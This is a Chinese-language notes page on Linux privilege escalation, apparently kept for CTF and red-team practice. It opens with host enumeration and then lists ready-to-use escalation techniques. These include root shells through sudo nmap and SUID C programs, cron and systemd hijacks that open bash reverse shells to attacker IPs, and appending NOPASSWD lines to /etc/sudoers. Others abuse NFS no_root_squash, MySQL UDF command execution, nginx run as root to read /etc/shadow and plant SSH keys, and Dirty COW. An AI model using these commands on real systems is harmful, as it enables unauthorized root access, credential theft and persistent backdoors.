---
title: linux提权
date: 2025-03-19 14:50:13	
tags: linux提权
categories: Linux
---



# 信息枚举

## 主机名（hostname）

### 检索当前主机名

```hostname
hostname
```

### 检索所有分配的IP地址

```
hostname -I
```

### 操作系统

```
uname -a
```

#### /proc/version

proc 文件系统 （procfs） 提供有关目标系统进程的信息。查看 `/proc/version` 可能会为您提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 GCC）。

#### /etc/issue 

也可以通过查看 `/etc/issue` 文件来识别系统。此文件通常包含有关操作系统的一些信息，但可以很容易地进行自定义或更改。

#### /etc/*-release

### 网络信息

```
ip addr
```

路由表

```
routel
```

连接信息

```
ss -ano
```

### 任务进程

计划任务

```
ls -lah /etc/cron*
```

### 已安装的应用程序

```
dpkg -l
```

### 已安装的模块

```
lsmod
```

查看模块的详细信息

```
/sbin/modinfo +mod
```



### 自动化脚本

linpeas.sh

位置:D:\CTF\红队\linux提权\信息枚举自动化脚本

- **LinPeas**: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- **LinEnum:** https://github.com/rebootuser/LinEnum
- **LES (Linux Exploit Suggester):** https://github.com/mzet-/linux-exploit-suggester
- **Linux Smart Enumeration:** https://github.com/diego-treitos/linux-smart-enumeration
- **Linux Priv Checker:** https://github.com/linted/linuxprivchecker

### 查看服务

```
ps -ef
```



# linux提权

## 内核漏洞

查看内核

```
uname -a
uname -r
```

searchsploit + 内核版本

google

https://www.cvedetails.com/



上传exp可以服务器开启http服务

靶机wget进行请求

```
sudo python3 -m http.server
wget http://10.10.10.10:8080/test
```



## Sudo

sudo -l查看当前用户可以使用的命令

https://gtfobins.github.io/ 

## doas

doas是sudo的替代品

默认情况安装到`/usr/local/bin`，其配置文件在`/usr/local/etc/doas.conf`

doas.conf的语法

```
permit|deny [options] identity [as target] [cmd command [args ...]]
```

options包括

> 1. nopass，执行命令时不需要输入密码
> 2. nolog，命令执行成功时不会记录
> 3. persist，授权后，一段时间内不会要求再次输入密码
> 4. keepenv，如果没有其他说明，保持环境变量不变
> 5. setenv，设置临时的环境变量，具体方法为 `setenv { -ENV PS1=$DOAS_PS1 SSH_AUTH_SOCK }`

## nmap

### Nmap Interactive Mode Nmap 交互模式

如果你有执行 nmap 的 sudo 权限，可以使用两种方法通过 nmap 升级，这取决于机器上安装的版本。我们可以使用 `nmap -v` 检查 nmap 的版本。

对于 nmap 版本 2.02 到 5.21，可以与 nmap 一起使用交互模式来执行 shell 命令。

```shell
$ sudo nmap --interactive
这应该会给你一个升高的 shell。
```

### Nmap Scripting Engine Nmap 脚本引擎

较新版本的 nmap 已删除在交互模式下运行的选项。相反，我们可以通过使用 nmap 脚本功能执行自定义 lua 脚本来提升权限。`os.execute` 函数应该为我们提供对系统命令的访问。


下面是一个快速而肮脏的脚本，用于获取 root shell：

```shell
$ echo 'os.execute("/bin/bash")' > /tmp/rootme.nse
```

```shell
sudo nmap --script /tmp/rootme.nse
```

### Alternatives 选择

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void){
	setuid(0); setgid(0); system("/bin/bash");
}
```

将文件传输到目标计算机上，并创建以下 nse 脚本。同样，使用

```
 sudo nmap --script rootme.nse 
```


 运行 nse 脚本。

```
author = "w0lfram1te"
categories = {"default", "safe"}

prerule = function()
	return "True"
end

action = function(prerule)
	os.execute("chown root.root /tmp/rootme")
	os.execute("chmod +sx /tmp/rootme")
	return "nmap priv escalation"
end
```

## SUID

将列出设置了 SUID 或 SGID 位的文件。

```
find / -type f -perm -04000 -ls 2>/dev/null 
```

典型的使用SUID的命令

![rSRTn5v](Linux%20Privilege/rSRTn5v.png)

https://gtfobins.github.io/ 

## Capability

libcap 提供了 getcap 和 setcap 两个命令来分别查看和设置文件的 capabilities，同时还提供了 capsh 来查看当前 shell 进程的 capabilities。libcap-ng 更易于使用，使用同一个命令 filecap 来查看和设置 capabilities。

```
1.1查看单个文件的capabilities

[root@blackstone ~]# getcap /usr/bin/ping
/usr/bin/ping = cap_net_admin,cap_net_raw+p

1.2 递归查看capabilities
[root@blackstone ~]# getcap -r  /usr/
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/local/nginx/sbin/nginx = cap_net_bind_service+eip

1.3 查看进程的capabilities
[root@blackstone ~]# getpcaps 1085
Capabilities for `1085': =

1.4 查看一组相互关联的线程的 capabilities（比如 nginx）
[root@blackstone ~]# getpcaps $(pgrep nginx)
```

## Cron jobs

如果有一个使用 root 权限运行的计划任务，并且我们可以更改将要运行的脚本，那么我们的脚本将使用 root 权限运行。

查看cron作业

```
cat /etc/crontab
```

管理员可能删除了脚本但是没有删除cron作业

```
ls /etc/spool/cron
```

若发现update自动运行

### 提权方式一

```
printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.202.6/8080 0>&1\n' > /tmp/update
```

本地监听等待反弹shell

### 提权方式二

将用户权限写入/etc/sudoers

```
echo 'chmod +w /etc/sudoers && echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /tmp/update
```

### 提权方式三

```c++
#include<unistd.h>
void main(void)
{
system("chown root:root /tmp/update");
system("chmod 4755 /tmp/update");
setuid(0);
setgid(0);
execl("/bin/sh","sh",NULL);
}
```







## PATH

寻找可写目录

```shell
find / -writable 2>/dev/null
```

在可写目录中创建脚本dom.c

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
int main()
{
        setgid(0);
        setuid(0);
        system("/bin/bash");
    	return 0;
}

```

使用Gcc编译

```shell
gcc dom.c -o shell
```

赋予shell文件 SUID权限

```
chmod u+s shell
```

将该目录添加到环境变量中，在靶机上搜索拥有suid或者04000权限的文件

```
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null 
```

然后利用可执行文件去执行编译好的shell即可提权

Linux 中的 PATH 是一个环境变量，它告诉操作系统在何处搜索可执行文件。对于任何未内置于 shell 中或未使用绝对路径定义的命令，Linux 将开始在 PATH 下定义的文件夹中搜索。

添加环境变量

```shell
export PATH=/tmp:$PATH
```

## NFC(网络文件共享)

NFS（网络文件共享）配置保存在 /etc/exports 文件中。此文件是在 NFS 服务器安装期间创建的，通常可由用户读取。

**/ etc / exports** 文件包含将哪些文件夹/文件系统导出到远程用户的配置和权限。

<font color=red>这个文件的内容非常简单，每一行由抛出路径，客户名列表以及每个客户名后紧跟的访问选项构成：</font>

<font color=red>[共享的目录] [主机名或IP(参数,参数)]</font>>

**Root Squashing**（*root_sqaush*）参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程根用户在连接时会分配一个用户“ ***nfsnobody*** ”，它具有最少的本地特权。如果 no_*root_squash* 选项开启的话”，并为远程用户授予root用户对所连接系统的访问权限。在配置NFS驱动器时，系统管理员应始终使用“ *root_squash* ”参数。

### showmount

查看挂载

**语法格式**：showmount 参数 域名或IP地址

常用参数：

> -a显示客户端主机名和挂载目录
>
> -d 仅显示已被NFS客户端加载的目录 
>
> -v 显示版本信息
>
> -e 显示NFS服务器上所有的共享目录

```shell
sudo showmount -e x.x.x.x
```

### mount

进行挂载

```shell
sudo mount -o rw 10.10.10.10:/tmp /home/kali/mount1
```

取消挂载

```
umount /home/kali/mount1
```



```
#查看NFS服务器上的共享目录
sudo showmount -e x.x.x.x
#创建本地挂载目录，挂载共享目录。使用攻击者本地root权限创建Suid shell
sudo mkdir -p /tmp
sudo mount -t nfs x.x.x.x:/home/test /tmp
cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
#回到要提权的服务器上，使用普通用户使用shell -p来获取root权限

```

```
有个挂载目录无权限，是因为uuid不匹配
需要在本地创建相同的用户和uuid即可访问
```

### 更改/etc/exports文件提权

```
加入这一行，相当于将root目录共享，并且授予root用户权限
/root           *(no_root_squash,insecure,rw)
```

但是需要重启物理机，重启物理机后

```
showmount -e ip 
```

可以发现/root目录已经被共享

可以将攻击机的公钥写入/root/.ssh/authorized_keys

<font color=red>**重点：要将authorized_keys写入当前目录下的.ssh**</font>

然后使用攻击机的私钥进行登录，就可以无需root密码登录root用户

## mysql

### UDF提权

**udf就是用户自制的函数**

mysql提权获取到的权限大小跟运行mysql所在服务器登录的账号的权限相关，如操作系统以普通用户登录的并启动mysql，经udf提权后也只能获取到系统的普通用户权限。而使用管理员登录操作系统运行mysql，提权后获取的权限则为系统管理员权限。

#### 创建函数

```
create function sys_eval returns strings soname ‘lib_mysqludf_sys.so’;

or

create function sys_eval returns strings soname ‘lib_mysqludf_sys_64.so’;
```

#### 查看udf表

```
SELECT * FROM mysql.func;
可以查看有哪些udf函数
```

### 利用函数提权

sys_eval，执行任意系统命令，并将输出返回。

sys_exec，执行任意系统命令，并将退出码返回（无命令执行结果回显）。

```
select sys_eval('chown -R john:john /etc/sudoers');

然后再sudoers中添加john用户的权限
```

```
将john用户添加到管理员组
select sys_eval('usermod -a -G admin john');
```

## systemctl提权

### （一）mm.service

首先编写一个service unit用来被systemctl加载

```
[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/bash -i > /dev/tcp/10.10.16.8/9001 0>&1 2<&1"
[Install]
WantedBy=multi-user.target

#生成的unit名位mm.service
```

二、把unit放置在合适的位置

通常unit存放在`/usr/lib/systemd/system/` 和 `/etc/systemd/system/，可以被systemctl加载执行，但是渗透过程中需要提权的场景往往权限较小，这些目录不可写。而systemctl的特性决定了，当unit在/tmp目录下时，无法被systemctl加载。这里需要掌握一个神奇的目录：/dev/shm/,关于这个目录的解读可以移步：https://www.cnblogs.com/tinywan/p/10550356.html学习掌握。这里就可以把我们生成的unit文件放置再这个目录`

三、攻击机上启动监听

```
nc -lvnp 9999
```

四、被攻击机器执行下列命令启动我们写好的service unit

```
systemctl link /dev/shm/mm.service
systemctl enable --now /dev/shm/mm.service
```

这个时候可以在攻击机上看到反弹回的高权限shell

## nginx

### 文件读取

具有nginx的suid权限

编辑nginx配置文件，以root用户运行，映射到1337端口

```
nginx1.conf

user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```

```
sudo /usr/sbin/nginx -c /home/user/nginx1.conf
```

```
可以读取到敏感文件
curl localhost:1337/etc/shadow
```

### 文件写入

配置文件加入PUT请求

```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

```
sudo /usr/sbin/nginx -c /home/user/nginx2.conf
```

可以进行文件写入，将本地root用户的公钥写入，使用ssh连接

```
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'id_rsa.pub'
ssh -i ~/.ssh/id_rsa root@10.10.11.243
```

## Dstat提权

Dstat有个功能就是提供了用户自定义插件（python脚本）的功能

插件位置

```
/usr/share/dstat/
/usr/local/share/dstat/
```

可以在插件位置写入插件（提权脚本），使用sudo命令运行dstat插件

```python
import os
os.system("/bin/bash")
```

<font color=red>脚本的命名格式`dstat_xxx.py`</font>

使用sudo来调用这个插件，即可得到root权限



## SUID-enlightenment_sys

[CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)

# 脏牛提权

利用探针脚本检测存在的漏洞

git clone https://github.com/mzet-/linux-exploit-suggester

```
cve-2016-5919
git clone https://github.com/gbonacini/CVE-2016-5195

```

https://github.com/firefart/dirtycow.git

编译使用：

```
gcc -pthread dirty.c -o dirty -lcrypt
```


然后通过以下方式运行新创建的二进制文件：

```
./dirty
```


或者

```
 ./dirty my-new-password
```

之后，您可以su firefart或ssh firefart@...
运行漏洞利用程序后，不要忘记恢复 /etc/passwd！

```
mv /tmp/passwd.bak /etc/passwd
```



# 提权代码

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
int main()
{
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
```

```
将用户权限写进/etc/sudoers
echo "echo 'www-data ALL=(ALL) NOPASSWD:ALL >>/etc/sudoers' " >update
```

```
#! /bin/bash
bash -i &> /dev/tcp/10.10.16.5/4444 0>&1
```

